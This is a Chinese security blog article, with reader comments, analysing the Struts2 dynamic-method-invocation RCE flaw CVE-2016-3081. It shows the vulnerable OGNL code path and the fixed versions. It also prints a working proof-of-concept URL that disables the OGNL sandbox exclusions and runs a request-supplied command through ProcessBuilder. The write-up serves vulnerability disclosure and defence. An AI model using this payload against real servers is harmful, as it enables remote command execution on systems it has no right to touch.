<main class="main-container ng-scope" ng-view=""><div class="main receptacle post-view ng-scope"><article class="entry ng-scope" ng-controller="EntryCtrl" ui-lightbox=""><header><h1 class="entry-title ng-binding">Struts2方法调用远程代码执行漏洞（CVE-2016-3081）分析</h1><div class="entry-meta"><a target="_blank" class="author name ng-binding">绿盟科技</a> <span class="bull">·</span> <time title="2016/04/26 18:07" ui-time="" datetime="2016/04/26 18:07" class="published ng-binding ng-isolate-scope">2016/04/26 18:07</time></div></header><section class="entry-content ng-binding" ng-bind-html="postContentTrustedHtml"><p></p><h1>0x00 漏洞简述</h1><hr><p>2016年4月21日Struts2官方发布两个CVE，其中CVE-2016-3081官方评级为高。主要原因为在用户开启动态方法调用的情况下，会被攻击者实现远程代码执行攻击。从我自己搜索的情况来看，国内开启这个功能的网站不在少数，所以这个“Possible Remote Code Execution”漏洞的被打的可能性还是很高的。</p><h1>0x01 漏洞原理</h1><hr><p>直接进行版本比对，我们可以看到针对这个问题，只对DefaultActionMapper.java这个文件进行了修改，修改内容如下：</p><p><img alt="enter image description here" img-src="14430c7c76de88833d8b8c57274f85347f0d970d.jpg"></p><p>我们可以看到只是把method成员变量的值进行了一次过滤，cleanupActionName这个方法是在对“action:”滥用的问题进行添加的，禁止了绝大多数的特殊字符。但是在后来的版本变更中忽略了之前的问题，将method也引入了Ongl表达式，代码在DefaultAction.java的invokeAction中：</p><pre><code>#!java
protected String invokeAction(Object action, ActionConfig actionConfig) throws Exception {
    String methodName = proxy.getMethod();

    if (LOG.isDebugEnabled()) {
        LOG.debug("Executing action method = #0", methodName);
    }

    String timerKey = "invokeAction: " + proxy.getActionName();
    try {
        UtilTimerStack.push(timerKey);

        Object methodResult;
        try {
            methodResult = ognlUtil.getValue(methodName + "()", getStack().getContext(), action);
</code></pre><p>我们可以看到methodName被带入到getValue了，熟悉Struts相关漏洞的朋友应该都明白这是什么意思，虽然后面被强制添加了一对圆括号，但是想办法语法补齐就好了。相对应的我们来看下在2.3.18版本之前的代码是怎么处理methodName的：</p><pre><code>#!java
protected String invokeAction(Object action, ActionConfig actionConfig) throws Exception {
    String methodName = proxy.getMethod();

    if (LOG.isDebugEnabled()) {
        LOG.debug("Executing action method = #0", methodName);
    }

    String timerKey = "invokeAction: " + proxy.getActionName();
    try {
        UtilTimerStack.push(timerKey);

        boolean methodCalled = false;
        Object methodResult = null;
        Method method = null;
        try {
            method = getAction().getClass().getMethod(methodName, EMPTY_CLASS_ARRAY);
</code></pre><p>在这里使用的是反射，所以在这个漏洞发布的时候，我曾一瞬间觉得又是一个骗CVE的鸡肋，但是事实上，这是一个威胁很大的漏洞。但是官方说的受影响版本<code>Struts 2.0.0 - Struts Struts 2.3.28 (except 2.3.20.2 and 2.3.24.2)</code>是不严谨的，应该是<code>2.3.18-2.3.28(except 2.3.20.2 and 2.3.24.2)</code>。</p><h1>0x02 漏洞利用</h1><hr><p>利用方式主要难点在于两个地方，一个是上文提到的对于表达式最后的圆括号给予正确的表达式意义。另一个就是在传输过程中method会经过一次转义，双引号和单引号的没有办法使用了，所以需要找到一个绕过。剩下的就是原来套沙盒绕过，命令执行的那套东西了。</p><p>对于圆括号，可以直接使用<code>new java.lang.String</code>这样来拼接成<code>new java.lang.String()</code>构成正确Ognl语法。</p><p>至于不能使用引号的话，命令执行我们可以使用引用参数的方法来完成对字符串的提取，例如：使用#parameters.cmd来提取http的cmd参数。测试PoC如下：</p><blockquote><p>http://172.16.107.143:8080/Struts2&#95;3&#95;18/hello.action?cmd=gedit&amp;method:(%23&#95;memberAccess).setExcludedClasses(@<a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="e48e859285ca91908d88caa78b88888187908d8b8a97a4a1a9b4b0bd">[email&#160;protected]</a>&#95;SET),(%23&#95;memberAccess).setExcludedPackageNamePatterns(@<a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="84eee5f2e5aaf1f0ede8aac7ebe8e8e1e7f0edebeaf7c4c1c9d4d0dd">[email&#160;protected]</a>&#95;SET),%23cmd%3d%23parameters.cmd,%23a%3dnew%20java.lang.ProcessBuilder(%23cmd).start().getInputStream(),new java.lang.String</p></blockquote><p>效果如下图所示：</p><p><img alt="enter image description here" img-src="10c1fac889ccce6fb461af8e7a5a577e984be5af.jpg"></p><p>这里我小小的猜测一下，官方发布的日期是20，而漏洞提交team做宣传是在4月25日，那么是不是在提交CVE时还没有完成弹计算器的利用，还是为了符合漏洞提交规范做的延时？小八卦一下O(∩_∩)O。</p><h1>0x03 漏洞总结</h1><hr><p>虽然现在CVE已经发布，但是从目前网络情况上（twitter和微博）来看，并没有安全研究人员关注到这两个CVE，可能是因为官方发布过太多鸡肋的CVE了，国内的各路炒洞高手已经对Struts2麻木了。所以目前的情况是属于漏洞存在那里，发了CVE，但是没有任何人去研究利用，发布相关分析。这个漏洞和Struts2前N次被炒的热热闹闹的漏洞影响和危害相比，真是不可同日而语，这个漏洞真的很实在。</p><p>看到这里，打算磨拳擦掌要去调回显PoC的朋友们，这里我要在提醒一次。虽然我在之前说了存在这个问题的站点很多，但是这个漏洞存在版本限制，在Struts2.3.18及其以上的版本才可以触发。而国内大多数的站点由于Struts在2.3.16之后再也没有出现过大的问题，所以绝大多数停留在2.3.16这个版本，这让这个看似很不错的漏洞略显鸡肋了。</p><p><strong>防护方案</strong></p><p>目前官方已经推出了<code>2.3.20.2、2.3.24.2</code>和<code>2.3.28.1</code>修复了这个问题，大家可以针对自己所使用的版本进行升级。下载地址：<a href="https://struts.apache.org/download.cgi#struts23281">https://struts.apache.org/download.cgi#struts23281</a></p><p></p></section></article><div class="entry-controls clearfix"><div style="float:left;color:#9d9e9f;font-size:15px"><span>&copy;乌云知识库版权所有 未经许可 禁止转载</span></div></div><div id="comments" class="comment-list clearfix"><div id="comment-list"><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">Budi</span> <span class="reply-time">2016-05-06 18:00:13</span></div><p></p><p>自己搭环境试试，看懂原理，下次再曝漏洞，争取能自己写POC</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">Donkey</span> <span class="reply-time">2016-04-29 10:44:41</span></div><p></p><p>@vforbox 怎么触发poc啊，弹出计算器啥的</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">风滚草</span> <span class="reply-time">2016-04-28 21:50:54</span></div><p></p><p>看了reporter确实是安恒提交的</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">小苹果</span> <span class="reply-time">2016-04-28 14:30:04</span></div><p></p><p>是官方先发的CVE吧，<a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="1df9a0bdf9a6b1f8939ff8889bf892b7fb85b2f5a286f5bc91f9a79bf8959bfb838df88f916d727ef9a79bfe9d9ffe9d9ffe9d9f5df8b394fb9c8f">[email&#160;protected]</a> @绿盟</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">ADVERT</span> <span class="reply-time">2016-04-27 11:10:44</span></div><p></p><p>@安恒 哈哈</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">安恒</span> <span class="reply-time">2016-04-27 09:49:45</span></div><p></p><p>啊，好尴尬啊，这明明是我们发的cve，我们居然被绿盟抢先了，搞的像绿盟发的cve了，啊，啊。</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">vforbox</span> <span class="reply-time">2016-04-27 09:21:00</span></div><p></p><p>这么快都有分析了，好棒！ mark</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">nonsafety</span> <span class="reply-time">2016-04-27 07:56:19</span></div><p></p><p>都开始刷洞了。</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">局长</span> <span class="reply-time">2016-04-26 22:24:44</span></div><p></p><p>被刷满了，恐怖</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">昌维</span> <span class="reply-time">2016-04-26 21:51:56</span></div><p></p><p>首页都被刷满了</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">123123</span> <span class="reply-time">2016-04-26 19:40:09</span></div><p></p><p>谢谢分享：<br>Struts 2.3.15.2及之后版本默认在default.properties 设置struts.enable.DynamicMethodInvocation是false？</p><p></p></div></div></div></div></div></main>